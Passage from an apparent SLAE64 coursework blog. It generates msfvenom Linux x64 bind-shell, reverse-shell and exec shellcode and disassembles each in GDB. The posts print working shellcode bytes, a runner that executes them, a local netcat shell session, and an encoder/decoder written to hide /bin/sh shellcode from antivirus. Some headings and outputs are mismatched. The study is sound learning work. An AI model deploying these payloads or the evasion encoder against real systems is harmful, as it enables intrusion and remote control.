0x0000555555558063 \u0026lt;+35\u0026gt;: pop rax 0x0000555555558064 \u0026lt;+36\u0026gt;: syscall 0x0000555555558066 \u0026lt;+38\u0026gt;: xor rsi,rsi 0x0000555555558069 \u0026lt;+41\u0026gt;: push 0x2b 0x000055555555806b \u0026lt;+43\u0026gt;: pop rax 0x000055555555806c \u0026lt;+44\u0026gt;: syscall 0x000055555555806e \u0026lt;+46\u0026gt;: xchg rdi,rax 0x0000555555558070 \u0026lt;+48\u0026gt;: push 0x3 0x0000555555558072 \u0026lt;+50\u0026gt;: pop rsi 0x0000555555558073 \u0026lt;+51\u0026gt;: dec rsi 0x0000555555558076 \u0026lt;+54\u0026gt;: push 0x21 0x0000555555558078 \u0026lt;+56\u0026gt;: pop rax 0x0000555555558079 \u0026lt;+57\u0026gt;: syscall 0x000055555555807b \u0026lt;+59\u0026gt;: jne 0x555555558073 \u0026lt;code+51\u0026gt; 0x000055555555807d \u0026lt;+61\u0026gt;: push 0x3b 0x000055555555807f \u0026lt;+63\u0026gt;: pop rax 0x0000555555558080 \u0026lt;+64\u0026gt;: cdq 0x0000555555558081 \u0026lt;+65\u0026gt;: movabs rbx,0x68732f6e69622f 0x000055555555808b \u0026lt;+75\u0026gt;: push rbx 0x000055555555808c \u0026lt;+76\u0026gt;: mov rdi,rsp 0x000055555555808f \u0026lt;+79\u0026gt;: push rdx 0x0000555555558090 \u0026lt;+80\u0026gt;: push rdi 0x0000555555558091 \u0026lt;+81\u0026gt;: mov rsi,rsp 0x0000555555558094 \u0026lt;+84\u0026gt;: syscall End of assembler dump. Socket Syscall 0x0000555555558040 \u0026lt;+0\u0026gt;: push 0x29 0x0000555555558042 \u0026lt;+2\u0026gt;: pop rax 0x0000555555558043 \u0026lt;+3\u0026gt;: cdq 0x0000555555558044 \u0026lt;+4\u0026gt;: push 0x2 0x0000555555558046 \u0026lt;+6\u0026gt;: pop rdi 0x0000555555558047 \u0026lt;+7\u0026gt;: push 0x1 0x0000555555558049 \u0026lt;+9\u0026gt;: pop rsi 0x000055555555804a \u0026lt;+10\u0026gt;: syscall rax is set to 0x29 which is the socket syscall number.\ncdq is for clearing rdx.\nrdi is set to 0x2 which is AF_INET.\nrsi is set to 0x1 which is SOCK_STREAM\nBind Syscall 0x000055555555804c \u0026lt;+12\u0026gt;: xchg rdi,rax ; stores socket file descriptor in rdi 0x000055555555804e \u0026lt;+14\u0026gt;: push rdx ; rdx is null 0x000055555555804f \u0026lt;+15\u0026gt;: mov DWORD PTR [rsp],0x5c110002 0x0000555555558056 \u0026lt;+22\u0026gt;: mov rsi,rsp 0x0000555555558059 \u0026lt;+25\u0026gt;: push 0x10 0x000055555555805b \u0026lt;+27\u0026gt;: pop rdx 0x000055555555805c \u0026lt;+28\u0026gt;: push 0x31 0x000055555555805e \u0026lt;+30\u0026gt;: pop rax 0x000055555555805f \u0026lt;+31\u0026gt;: syscall push rdx will push 4 bytes of zeros regarding IPADDR_ANY. This means it will bind in all interfaces.\n0x5c110002\n0002 is AF_INET 5c11 if for PORT 4444 in Little-Endian format Then puts 0x10 (16 bytes) in rdx which is the struct size\n0x31 is bind syscall number. Listen Syscall 0x0000555555558061 \u0026lt;+33\u0026gt;: push 0x32 0x0000555555558063 \u0026lt;+35\u0026gt;: pop rax 0x0000555555558064 \u0026lt;+36\u0026gt;: syscall\nPuts 0x32 in rax, listen syscall number\nListen as a 2nd argument called backlog h in rsi which defines the maximum length to which the queue of pending connections for sockfd may grow. This does not have fundamental importance for our exercise.\nAccept Syscall 0x0000555555558066 \u0026lt;+38\u0026gt;: xor rsi,rsi 0x0000555555558069 \u0026lt;+41\u0026gt;: push 0x2b 0x000055555555806b \u0026lt;+43\u0026gt;: pop rax 0x000055555555806c \u0026lt;+44\u0026gt;: syscall Clear rsi and put accpet ssycall number in rax. As there is no struct needed for the socket address, rsi and rdx are set to zero.\nDup2 Syscall Loop 0x0000555555558070 \u0026lt;+48\u0026gt;: push 0x3 0x0000555555558072 \u0026lt;+50\u0026gt;: pop rsi 0x0000555555558073 \u0026lt;+51\u0026gt;: dec rsi 0x0000555555558076 \u0026lt;+54\u0026gt;: push 0x21 0x0000555555558078 \u0026lt;+56\u0026gt;: pop rax 0x0000555555558079 \u0026lt;+57\u0026gt;: syscall 0x000055555555807b \u0026lt;+59\u0026gt;: jne 0x555555558073 \u0026lt;code+51\u0026gt; The already \u0026ldquo;famous\u0026rdquo; dup2 syscall loop for stdin, stdout and stderr.\nPuts 0x21, the dup2 syscall number in rax\nExecve Syscall The syscall used to call /bin/sh and spawn a shell to an incoming connection.\n0x000055555555807d \u0026lt;+61\u0026gt;: push 0x3b 0x000055555555807f \u0026lt;+63\u0026gt;: pop rax 0x0000555555558080 \u0026lt;+64\u0026gt;: cdq set rax with execve syscall cdq clears rdx 0x0000555555558081 \u0026lt;+65\u0026gt;: movabs rbx,0x68732f6e69622f ; /bin/sh 0x000055555555808b \u0026lt;+75\u0026gt;: push rbx ; push null 0x000055555555808c \u0026lt;+76\u0026gt;: mov rdi,rsp rdi is set to the memory address of the null-terminated string /bin/sh 0x000055555555808f \u0026lt;+79\u0026gt;: push rdx ; push null 0x0000555555558090 \u0026lt;+80\u0026gt;: push rdi ; push memory of /bin/sh 0x0000555555558091 \u0026lt;+81\u0026gt;: mov rsi,rsp 0x0000555555558094 \u0026lt;+84\u0026gt;: syscall rsi is set to a pointer of a pointer address of /bin/sh Calls execve with the syscall isntruction Shellcode 2 - linux/x64/shell_reverse_tcp The first step to do is generate the shellcode using MSF. As usual, let\u0026rsquo;s check its arguments\nmsfvenom -p linux/x64/shell_reverse_tcp --list-options\n-[~]$ msfvenom -p linux/x64/shell_reverse_tcp --list-options Options for payload/linux/x64/shell_reverse_tcp: ========================= Name: Linux Command Shell, Reverse TCP Inline Module: payload/linux/x64/shell_reverse_tcp Platform: Linux Arch: x64 Needs Admin: No Total size: 74 Rank: Normal Provided by: ricky Basic options: Name Current Setting Required Description ---- --------------- -------- ----------- LHOST yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Let\u0026rsquo;s get our bind shell using msfvenom. The command below will by default point to 127.0.0.1 and port 4444.\n[~]$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=\u0026#39;127.1.1.1\u0026#39; -f c [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload [-] No arch selected, selecting arch: x64 from the payload No encoder specified, outputting raw payload Payload size: 74 bytes unsigned char shellcode[] = \u0026#34;\\x6a\\x29\\x58\\x99\\x6a\\x02\\x5f\\x6a\\x01\\x5e\\x0f\\x05\\x48\\x97\\x48\u0026#34; \u0026#34;\\xb9\\x02\\x00\\x11\\x5c\\x7f\\x01\\x01\\x01\\x51\\x48\\x89\\xe6\\x6a\\x10\u0026#34; \u0026#34;\\x5a\\x6a\\x2a\\x58\\x0f\\x05\\x6a\\x03\\x5e\\x48\\xff\\xce\\x6a\\x21\\x58\u0026#34; \u0026#34;\\x0f\\x05\\x75\\xf6\\x6a\\x3b\\x58\\x99\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\u0026#34; \u0026#34;\\x73\\x68\\x00\\x53\\x48\\x89\\xe7\\x52\\x57\\x48\\x89\\xe6\\x0f\\x05\u0026#34;; Compile and Testing the Shellcode Adding the shellcode to our tester program - shellcode.c\n#include\u0026lt;stdio.h\u0026gt; #include\u0026lt;string.h\u0026gt; unsigned char code[] = \\ \u0026#34;\\x6a\\x29\\x58\\x99\\x6a\\x02\\x5f\\x6a\\x01\\x5e\\x0f\\x05\\x48\\x97\u0026#34; \u0026#34;\\x52\\xc7\\x04\\x24\\x02\\x00\\x11\\x5c\\x48\\x89\\xe6\\x6a\\x10\\x5a\u0026#34; \u0026#34;\\x6a\\x31\\x58\\x0f\\x05\\x6a\\x32\\x58\\x0f\\x05\\x48\\x31\\xf6\\x6a\u0026#34; \u0026#34;\\x2b\\x58\\x0f\\x05\\x48\\x97\\x6a\\x03\\x5e\\x48\\xff\\xce\\x6a\\x21\u0026#34; \u0026#34;\\x58\\x0f\\x05\\x75\\xf6\\x6a\\x3b\\x58\\x99\\x48\\xbb\\x2f\\x62\\x69\u0026#34; \u0026#34;\\x6e\\x2f\\x73\\x68\\x00\\x53\\x48\\x89\\xe7\\x52\\x57\\x48\\x89\\xe6\u0026#34; \u0026#34;\\x0f\\x05\u0026#34;; main() { printf(\u0026#34;Shellcode Length: %d\\n\u0026#34;, strlen(code)); int (*ret)() = (int(*)())code; ret(); } Compiling with gcc and executing it.\n╭─edu@debian ~/Desktop/slae_x86_64/assignments/5-MSF-Shellcode-Analysis/shell_reverse-tcp ‹main●› ╰─$ gcc -fno-stack-protector -z execstack -o shellcode shellcode.c shellcode.c:12:1: warning: return type defaults to ‘int’ [-Wimplicit-int] main() { ^~~~ ╭─edu@debian ~/Desktop/slae_x86_64/assignments/5-MSF-Shellcode-Analysis/shell_reverse-tcp ‹main●› ╰─$ ./shellcode Shellcode Length: 17 ---------------- ╭─edu@debian ~/Desktop/slae_x86_64/assignments/1-shell-bind-tcp-password-shellcode ‹main●› ╰─$ nc -lvnp 4444 1 ↵ listening on [any] 4444 ... connect to [127.1.1.1] from (UNKNOWN) [127.0.0.1] 44176 whoami edu GDB Analysis For this analysis I used GEF plugin to assist my analysis with GDB.\ngdb -q ./shellcode First, we put a breakpoint in code[] to pause the execution at the beginning of the shellcode.\n─edu@debian ~/Desktop/slae_x86_64/assignments/5-MSF-Shellcode-Analysis/shell_reverse-tcp ‹main●› ╰─$ gdb -q shellcode GEF for linux ready, type `gef\u0026#39; to start, `gef config\u0026#39; to configure 77 commands loaded for GDB 8.2.1 using Python engine 3.7 gef➤ b *\u0026amp;code Breakpoint 1 at 0x4060 gef➤ r We go direct to the shellcode\u0026rsquo;s first instruction.\nDisassembling Reverse TCP Shellcode With the instruction disas we can disassemble the code function. In our context is the Bind Shellcode.\ngef➤ disas Dump of assembler code for function code: =\u0026gt; 0x0000555555558060 \u0026lt;+0\u0026gt;: push 0x29 0x0000555555558062 \u0026lt;+2\u0026gt;: pop rax 0x0000555555558063 \u0026lt;+3\u0026gt;: cdq 0x0000555555558064 \u0026lt;+4\u0026gt;: push 0x2 0x0000555555558066 \u0026lt;+6\u0026gt;: pop rdi 0x0000555555558067 \u0026lt;+7\u0026gt;: push 0x1 0x0000555555558069 \u0026lt;+9\u0026gt;: pop rsi 0x000055555555806a \u0026lt;+10\u0026gt;: syscall 0x000055555555806c \u0026lt;+12\u0026gt;: xchg rdi,rax 0x000055555555806e \u0026lt;+14\u0026gt;: movabs rcx,0x101017f5c110002 0x0000555555558078 \u0026lt;+24\u0026gt;: push rcx 0x0000555555558079 \u0026lt;+25\u0026gt;: mov rsi,rsp 0x000055555555807c \u0026lt;+28\u0026gt;: push 0x10 0x000055555555807e \u0026lt;+30\u0026gt;: pop rdx 0x000055555555807f \u0026lt;+31\u0026gt;: push 0x2a 0x0000555555558081 \u0026lt;+33\u0026gt;: pop rax 0x0000555555558082 \u0026lt;+34\u0026gt;: syscall 0x0000555555558084 \u0026lt;+36\u0026gt;: push 0x3 0x0000555555558086 \u0026lt;+38\u0026gt;: pop rsi 0x0000555555558087 \u0026lt;+39\u0026gt;: dec rsi 0x000055555555808a \u0026lt;+42\u0026gt;: push 0x21 0x000055555555808c \u0026lt;+44\u0026gt;: pop rax 0x000055555555808d \u0026lt;+45\u0026gt;: syscall 0x000055555555808f \u0026lt;+47\u0026gt;: jne 0x555555558087 \u0026lt;code+39\u0026gt; 0x0000555555558091 \u0026lt;+49\u0026gt;: push 0x3b 0x0000555555558093 \u0026lt;+51\u0026gt;: pop rax 0x0000555555558094 \u0026lt;+52\u0026gt;: cdq 0x0000555555558095 \u0026lt;+53\u0026gt;: movabs rbx,0x68732f6e69622f 0x000055555555809f \u0026lt;+63\u0026gt;: push rbx 0x00005555555580a0 \u0026lt;+64\u0026gt;: mov rdi,rsp 0x00005555555580a3 \u0026lt;+67\u0026gt;: push rdx 0x00005555555580a4 \u0026lt;+68\u0026gt;: push rdi 0x00005555555580a5 \u0026lt;+69\u0026gt;: mov rsi,rsp 0x00005555555580a8 \u0026lt;+72\u0026gt;: syscall 0x00005555555580aa \u0026lt;+74\u0026gt;: add BYTE PTR [rax],al End of assembler dump. Socket Syscall 0x0000555555558040 \u0026lt;+0\u0026gt;: push 0x29 0x0000555555558042 \u0026lt;+2\u0026gt;: pop rax 0x0000555555558043 \u0026lt;+3\u0026gt;: cdq 0x0000555555558044 \u0026lt;+4\u0026gt;: push 0x2 0x0000555555558046 \u0026lt;+6\u0026gt;: pop rdi 0x0000555555558047 \u0026lt;+7\u0026gt;: push 0x1 0x0000555555558049 \u0026lt;+9\u0026gt;: pop rsi 0x000055555555804a \u0026lt;+10\u0026gt;: syscall rax is set to 0x29 which is the socket syscall number.\ncdq sets rdx to null.\nrdi is set to 0x2 which is AF_INET.\nrsi is set to 0x1 which is SOCK_STREAM\nConnect Syscall Below the struct for the socket address.\n0x000055555555804c \u0026lt;+12\u0026gt;: xchg rdi,rax ; stores socket file descriptor in rdi 0x000055555555806e \u0026lt;+14\u0026gt;: movabs rcx,0x101017f5c110002 0x0000555555558078 \u0026lt;+24\u0026gt;: push rcx 0x0000555555558079 \u0026lt;+25\u0026gt;: mov rsi,rsp 0x000055555555807c \u0026lt;+28\u0026gt;: push 0x10 0x000055555555807e \u0026lt;+30\u0026gt;: pop rdx 0x000055555555807f \u0026lt;+31\u0026gt;: push 0x2a 0x0000555555558081 \u0026lt;+33\u0026gt;: pop rax 0x0000555555558082 \u0026lt;+34\u0026gt;: syscall Puts 0x101017f5c110002 in rcx and passes the struct pointer to rsi 0002 is AF_INET 5c11 if for PORT 4444 in Little-Endian format 101017f if the IP address 127.0.0.1 Then puts 0x10 (16 bytes) in rdx which is the struct size\n0x2a is connect syscall number. Dup2 Syscall Loop 0x0000555555558070 \u0026lt;+48\u0026gt;: push 0x3 0x0000555555558072 \u0026lt;+50\u0026gt;: pop rsi 0x0000555555558073 \u0026lt;+51\u0026gt;: dec rsi 0x0000555555558076 \u0026lt;+54\u0026gt;: push 0x21 0x0000555555558078 \u0026lt;+56\u0026gt;: pop rax 0x0000555555558079 \u0026lt;+57\u0026gt;: syscall 0x000055555555807b \u0026lt;+59\u0026gt;: jne 0x555555558073 \u0026lt;code+51\u0026gt; The already \u0026ldquo;famous\u0026rdquo; dup2 syscall loop for stdin, stdout and stderr.\nPuts 0x21, the dup2 syscall number in rax\nExecve Syscall The syscall used to call /bin/sh and spawn a shell to an incoming connection.\n0x000055555555807d \u0026lt;+61\u0026gt;: push 0x3b 0x000055555555807f \u0026lt;+63\u0026gt;: pop rax 0x0000555555558080 \u0026lt;+64\u0026gt;: cdq set rax with execve syscall cdq clears rdx 0x0000555555558081 \u0026lt;+65\u0026gt;: movabs rbx,0x68732f6e69622f ; /bin/sh 0x000055555555808b \u0026lt;+75\u0026gt;: push rbx ; push null 0x000055555555808c \u0026lt;+76\u0026gt;: mov rdi,rsp rdi is set to the memory address of the null-terminated string /bin/sh 0x000055555555808f \u0026lt;+79\u0026gt;: push rdx ; push null 0x0000555555558090 \u0026lt;+80\u0026gt;: push rdi ; push memory of /bin/sh 0x0000555555558091 \u0026lt;+81\u0026gt;: mov rsi,rsp 0x0000555555558094 \u0026lt;+84\u0026gt;: syscall rsi is set to a pointer of a pointer address of /bin/sh Calls execve with the syscall instruction Shellcode 3 - linux/x64/exec The first step to do is generate the shellcode using MSF. As usual, let\u0026rsquo;s check its arguments\nmsfvenom -p linux/x64/exec --list-options\n-[~]$ msfvenom -p linux/x64/shell_reverse_tcp --list-options Options for payload/linux/x64/shell_reverse_tcp: ========================= Name: Linux Command Shell, Reverse TCP Inline Module: payload/linux/x64/shell_reverse_tcp Platform: Linux Arch: x64 Needs Admin: No Total size: 74 Rank: Normal Provided by: ricky Basic options: Name Current Setting Required Description ---- --------------- -------- ----------- LHOST yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Description: Connect back to attacker and spawn a command shell Let\u0026rsquo;s get our bind shell using msfvenom. The command below will by default point to 127.0.0.1 and port 4444.\n[~]$ msfvenom -p linux/x64/exec CMD=whoami -f c [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload [-] No arch selected, selecting arch: x64 from the payload No encoder specified, outputting raw payload Payload size: 43 bytes Final size of c file: 208 bytes unsigned char buf[] = \u0026#34;\\x48\\xb8\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x00\\x99\\x50\\x54\\x5f\u0026#34; \u0026#34;\\x52\\x66\\x68\\x2d\\x63\\x54\\x5e\\x52\\xe8\\x07\\x00\\x00\\x00\\x77\u0026#34; \u0026#34;\\x68\\x6f\\x61\\x6d\\x69\\x00\\x56\\x57\\x54\\x5e\\x6a\\x3b\\x58\\x0f\u0026#34; \u0026#34;\\x05\u0026#34;; Compile and Testing the Shellcode Adding the shellcode to our tester program - shellcode.c\n#include\u0026lt;stdio.h\u0026gt; #include\u0026lt;string.h\u0026gt; unsigned char code[] = \\ \u0026#34;\\x48\\xb8\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x00\\x99\\x50\\x54\\x5f\u0026#34; \u0026#34;\\x52\\x66\\x68\\x2d\\x63\\x54\\x5e\\x52\\xe8\\x07\\x00\\x00\\x00\\x77\u0026#34; \u0026#34;\\x68\\x6f\\x61\\x6d\\x69\\x00\\x56\\x57\\x54\\x5e\\x6a\\x3b\\x58\\x0f\u0026#34; \u0026#34;\\x05\u0026#34;; main() { printf(\u0026#34;Shellcode Length: %d\\n\u0026#34;, strlen(code)); int (*ret)() = (int(*)())code; ret(); } Compiling with gcc and executing it.\n╭─edu@debian ~/Desktop/slae_x86_64/assignments/5-MSF-Shellcode-Analysis/exec ‹main●› ╰─$ gcc -fno-stack-protector -z execstack -o shellcode shellcode.c 130 ↵ shellcode.c:11:1: warning: return type defaults to ‘int’ [-Wimplicit-int] main() { ^~~~ ╭─edu@debian ~/Desktop/slae_x86_64/assignments/5-MSF-Shellcode-Analysis/exec ‹main●› ╰─$ ./shellcode Shellcode Length: 9 edu GDB Analysis For this analysis I used GEF plugin to assist my analysis with GDB.\ngdb -q ./shellcode First, we put a breakpoint in code[] to pause the execution at the beginning of the shellcode.\n╭─edu@debian ~/Desktop/slae_x86_64/assignments/5-MSF-Shellcode-Analysis/exec ‹main●› ╰─$ gdb -q shellcode GEF for linux ready, type `gef\u0026#39; to start, `gef config\u0026#39; to configure 77 commands loaded for GDB 8.2.1 using Python engine 3.7 gef➤ b *\u0026amp;code Breakpoint 1 at 0x4060 gef➤ r We go direct to the shellcode\u0026rsquo;s first instruction.\nDisassembling Reverse TCP Shellcode With the instruction disas we can disassemble the code function. In our context is the exec Shellcode.\nDisassembling Reverse TCP Shellcode gef➤ disas Dump of assembler code for function code: =\u0026gt; 0x0000555555558060 \u0026lt;+0\u0026gt;: movabs rax,0x68732f6e69622f 0x000055555555806a \u0026lt;+10\u0026gt;: cdq 0x000055555555806b \u0026lt;+11\u0026gt;: push rax 0x000055555555806c \u0026lt;+12\u0026gt;: push rsp 0x000055555555806d \u0026lt;+13\u0026gt;: pop rdi 0x000055555555806e \u0026lt;+14\u0026gt;: push rdx 0x000055555555806f \u0026lt;+15\u0026gt;: pushw 0x632d 0x0000555555558073 \u0026lt;+19\u0026gt;: push rsp 0x0000555555558074 \u0026lt;+20\u0026gt;: pop rsi 0x0000555555558075 \u0026lt;+21\u0026gt;: push rdx 0x0000555555558076 \u0026lt;+22\u0026gt;: call 0x555555558082 \u0026lt;code+34\u0026gt; 0x000055555555807b \u0026lt;+27\u0026gt;: ja 0x5555555580e5 0x000055555555807d \u0026lt;+29\u0026gt;: outs dx,DWORD PTR ds:[rsi] 0x000055555555807e \u0026lt;+30\u0026gt;: (bad) 0x000055555555807f \u0026lt;+31\u0026gt;: ins DWORD PTR es:[rdi],dx 0x0000555555558080 \u0026lt;+32\u0026gt;: imul eax,DWORD PTR [rax],0x5e545756 0x0000555555558086 \u0026lt;+38\u0026gt;: push 0x3b 0x0000555555558088 \u0026lt;+40\u0026gt;: pop rax 0x0000555555558089 \u0026lt;+41\u0026gt;: syscall 0x000055555555808b \u0026lt;+43\u0026gt;: add BYTE PTR [rax],al End of assembler dump. /bin/sh? Push, push and push to the stack! 0x0000555555558060 \u0026lt;+0\u0026gt;: movabs rax,0x68732f6e69622f ; /bin/sh 0x000055555555806a \u0026lt;+10\u0026gt;: cdq 0x000055555555806b \u0026lt;+11\u0026gt;: push rax 0x000055555555806c \u0026lt;+12\u0026gt;: push rsp 0x000055555555806d \u0026lt;+13\u0026gt;: pop rdi /bin/sh moved to rax and pushed to the stack. cdq zeroes rdx. pushed a pointer of a pointer to /binsh with push rsp and poped to rdi. It holds a pointer to the command to be executed. Command Flag (-c) 0x000055555555806e \u0026lt;+14\u0026gt;: push rdx 0x000055555555806f \u0026lt;+15\u0026gt;: pushw 0x632d ; -c 0x0000555555558073 \u0026lt;+19\u0026gt;: push rsp 0x0000555555558074 \u0026lt;+20\u0026gt;: pop rsi push rdx null terminates -c string. rdi points to -c Obfudcated \u0026ldquo;Call-Push-Pop\u0026rdquo; Syscall? Calling execve in a different way 0x0000555555558076 \u0026lt;+22\u0026gt;: call 0x555555558082 \u0026lt;code+34\u0026gt; 0x000055555555807b \u0026lt;+27\u0026gt;: ja 0x5555555580e5 [...] 0x0000555555558080 \u0026lt;+32\u0026gt;: imul eax,DWORD PTR [rax],0x5e545756 ; redirected to the \u0026#34;middle\u0026#34; 0x555555558086 \u0026lt;code+38\u0026gt;: push 0x3b 0x555555558088 \u0026lt;code+40\u0026gt;: pop rax 0x555555558089 \u0026lt;code+41\u0026gt;: syscall Here we have a deja vú of the SLAE32 MSF Shellcode Analysis assignment.\nThe call is used to store the next instruction address onto the stack and redirect execution further in the \u0026ldquo;middle\u0026rdquo; of 0x0000555555558080 \u0026lt;+32\u0026gt;: imul eax,DWORD PTR [rax],0x5e545756 instruction\ngef➤ x/7i 0x555555558082 0x555555558082 \u0026lt;code+34\u0026gt;: push rsi 0x555555558083 \u0026lt;code+35\u0026gt;: push rdi 0x555555558084 \u0026lt;code+36\u0026gt;: push rsp 0x555555558085 \u0026lt;code+37\u0026gt;: pop rsi 0x555555558086 \u0026lt;code+38\u0026gt;: push 0x3b 0x555555558088 \u0026lt;code+40\u0026gt;: pop rax 0x555555558089 \u0026lt;code+41\u0026gt;: syscall Based on the call address, I examined the isntruction after that address and the above obfuscated appeared \u0026ldquo;magically\u0026rdquo;.\nThe execve\u0026rsquo;s Command 0x0000555555558076 \u0026lt;+22\u0026gt;: call 0x555555558082 \u0026lt;code+34\u0026gt; 0x000055555555807b \u0026lt;+27\u0026gt;: ja 0x5555555580e5 0x000055555555807d \u0026lt;+29\u0026gt;: outs dx,DWORD PTR ds:[rsi] 0x000055555555807e \u0026lt;+30\u0026gt;: (bad) 0x000055555555807f \u0026lt;+31\u0026gt;: ins DWORD PTR es:[rdi],dx 0x0000555555558080 \u0026lt;+32\u0026gt;: imul eax,DWORD PTR [rax],0x5e545756 The call instruction does the magic here. It pushes onto the top of the stack at the following address. In practical terms, the next instruction\u0026rsquo;s bytes are pushed onto the stack, and the CPU will read those bytes until it finds a null.\nIf we examine the address of ja 0x5555555580e5, we verify the command whoami is right there.\ngef➤ x/s 0x000055555555807b 0x55555555807b \u0026lt;code+27\u0026gt;: \u0026#34;whoami\u0026#34; Everything set, call execve! Let\u0026rsquo;s check how the stack and the registers are set before the interruption syscall.\nThis blog post has been created for completing the requirements of the x86_64 Assembly Language and Shellcoding on Linux (SLAE64): https://www.pentesteracademy.com/course?id=7\nStudent ID: PA-31319\nAll the source code files are available on GitHub at https://github.com/0xnibbles/slae_x86_64\n","permalink":"https://0xnibbles.github.io/posts/slae64/slae_64_assignment_5/","summary":"This post introduces my 5th mission of my SLAE64 journey.\nIntroduction The SLAE64 5th assignment\u0026rsquo;s purpose is to select three msfvenom payloads, dissect them with gdb, and document my analysis.\nFor this task, I selected the following payloads:\nlinux/x86/shell_bind_tcp linux/x86/shell_reverse_tcp linux/x86/chmod Shellcode 1 - linux/x64/shell_bind_tcp The first step to do is to generate the shellcode using MSF. As usual, let’s check its arguments.\nmsfvenom -p linux/x64/shell_bind_tcp --list-options\n-[~]$ msfvenom -p linux/x64/shell_bind_tcp --list-options Options for payload/linux/x64/shell_bind_tcp: ========================= Name: Linux Command Shell, Bind TCP Inline Module: payload/linux/x64/shell_bind_tcp Platform: Linux Arch: x64 Needs Admin: No Total size: 86 Rank: Normal Provided by: ricky Basic options: Name Current Setting Required Description ---- --------------- -------- ----------- LPORT 4444 yes The listen port RHOST no The target address Description: Listen for a connection and spawn a command shell Let\u0026rsquo;s get our bind shell using msfvenom.","title":"SLAE64 Assignment 5 - Msfvenom Shellcode Analysis "},{"content":" This post introduces my 4th mission of my SLAE64 journey.\nIntroduction The fourth assignment goal was to create my own custom encoder and decoder of the execve stack shellcode. As you may know, the purpose is to execute /bin/sh A shellcode encoder can be used for different purposes, making it harder to detect by AV engines or simply avoiding bad characters (such as null bytes).\nThere is a lot of overlap information with my post regarding the SLAE32 - Custom Encoder/Decoder Shellcode (FlipRotation Encoder/Decoder). I advise you to look at it if you haven’t done it already. There are some essential concepts and ideas to understand what and why the shellcode is doing.\nFlipRotation Algorithm Overview The algorithm logic is the same as the one described in the FlipRotation Algorithm. My approach here was to port the 32 to 64-bit version so I won’t go into details in this post.\nEncoder Similar to the 32-bit version but converted to output 64-bit assembly. Please see FlipRotation Encoder for more details.\nEncoder Output ╭─edu@debian ~/Desktop/slae_x86_64/assignments/4-Insertion-Encoder-Shellcode ‹main●› ╰─$ python3 flipRotation_Encoder.py _______________________________________________________________ \u0026lt;The \u0026#34;FlipRotation\u0026#34; Encoder - Bit flip and rotate your shellcode --------------------------------------------------------------- \\ ^__^ \\ (oo)\\_______ (__)\\ )\\/\\ ||----w | || || [*] Shellcode length: 32 [*] Shellcode: b\u0026#39;H1\\xc0PH\\xbb/bin//shSH\\x89\\xe7PH\\x89\\xe2WH\\x89\\xe6H\\x83\\xc0;\\x0f\\x05\u0026#39; [*] Key Provided by the user. Doing magic with it [*] Key: 0xa0 After rotation: 0x49 After rotation: 0x7 After rotation: 0x8a After rotation: 0x94 After rotation: 0xb1 After rotation: 0xde After rotation: 0x2d After rotation: 0xa4 After rotation: 0x45 After rotation: 0x4a After rotation: 0x7c After rotation: 0xa4 After rotation: 0xcf After rotation: 0x25 After rotation: 0x1c [*] \\x format: \\x49\\xff\\x18\\x02\\x7\\xff\\x8a\\xff\\x94\\xff\\xd5\\x02\\xb8\\x02\\xb1\\xff\\x68\\x02\\xde\\xff\\x8b\\x02\\xc5\\x02\\x27\\x02\\x2d\\xff\\x49\\x02\\xa4\\xff\\x88\\x02\\x73\\x02\\x45\\xff\\x4a\\xff\\x88\\x02\\x7c\\xff\\x59\\x02\\xa4\\xff\\x88\\x02\\xcf\\xff\\x25\\xff\\x50\\x02\\x1c\\xff\\xd1\\x02\\x38\\x02\\x8\\x02\\xa0\\xa0 [*] 0x format: 0x49,0xff,0x18,0x02,0x7,0xff,0x8a,0xff,0x94,0xff,0xd5,0x02,0xb8,0x02,0xb1,0xff,0x68,0x02,0xde,0xff,0x8b,0x02,0xc5,0x02,0x27,0x02,0x2d,0xff,0x49,0x02,0xa4,0xff,0x88,0x02,0x73,0x02,0x45,0xff,0x4a,0xff,0x88,0x02,0x7c,0xff,0x59,0x02,0xa4,0xff,0x88,0x02,0xcf,0xff,0x25,0xff,0x50,0x02,0x1c,0xff,0xd1,0x02,0x38,0x02,0x8,0x02,0xa0,0xa0 -------------------- [*] Hack the World! -------------------- Encoder script available at https://github.com/0xnibbles/slae_x86_64/blob/main/assignments/4-Insertion-Encoder-Shellcode/flipRotation_Encoder.py\nDecoder Similar to the 32-bit version but converted to output 64-bit assembly. Please see FlipRotation Encoder for more details.\nDecoder ; Student ID : PA-31319 ; Student Name : Eduardo Silva ; Assignment 4 : Custom Encoder/Decoder Shellcode (Linux/x86_64) Assembly - FlipRotation Encoder ; File Name : flipRotation_decoder.nasm global _start section .text _start: jmp decoder EncodedShellcode: db 0x49,0xff,0x18,0x02,0x7,0xff,0x8a,0xff,0x94,0xff,0xd5,0x02,0xb8,0x02,0xb1,0xff,0x68,0x02,0xde,0xff,0x8b,0x02,0xc5,0x02,0x27,0x02,0x2d,0xff,0x49,0x02,0xa4,0xff,0x88,0x02,0x73,0x02,0x45,0xff,0x4a,0xff,0x88,0x02,0x7c,0xff,0x59,0x02,0xa4,0xff,0x88,0x02,0xcf,0xff,0x25,0xff,0x50,0x02,0x1c,0xff,0xd1,0x02,0x38,0x02,0x8,0x02,0xa0,0xa0 ; 0xa0 is the stop marker decoder: lea rsi, [rel EncodedShellcode] lea rdi, [rsi+1]\t; pointing to second byte (0x02) from shellcode xor rax, rax mul rax\t; zeroes edx mov al,\t1 xor rcx, rcx xor rbx, rbx decode: mov bl, byte [rsi + rax]\t; mov parity byte to bl xor bl, 0xa0\t; check if reached the end marker | 0xa0 ^ 0xff = 0x5f jz short EncodedShellcode\t; reached the marker if Zero Flag not set xor bl, 0x5f\t; if equal parity is even (0xff) mov bl, byte [rsi + rdx] jnz odd even:\t; rotate right ror bl, cl jmp short bitFlip odd: ; rotate left rol bl, cl bitFlip: xor bl, 0x01 restore_next_byte: mov byte [rsi + rdx], bl\t; replaces the original byte mov bl, byte [rsi + rax+1] ; mov encoded byte mov byte [rdi], bl ; change last used parity byte for the next encoded byte inc rdi ; rdi points to position of the next parity byte add al, 2 ; offset added to next parity byte inc dl ; offset to the next encoded byte inc cl ; loop index value incremented ; Doing circular array as modulo workaround. Use 0x08 as a divisor or circular boundary because we are rotating 8 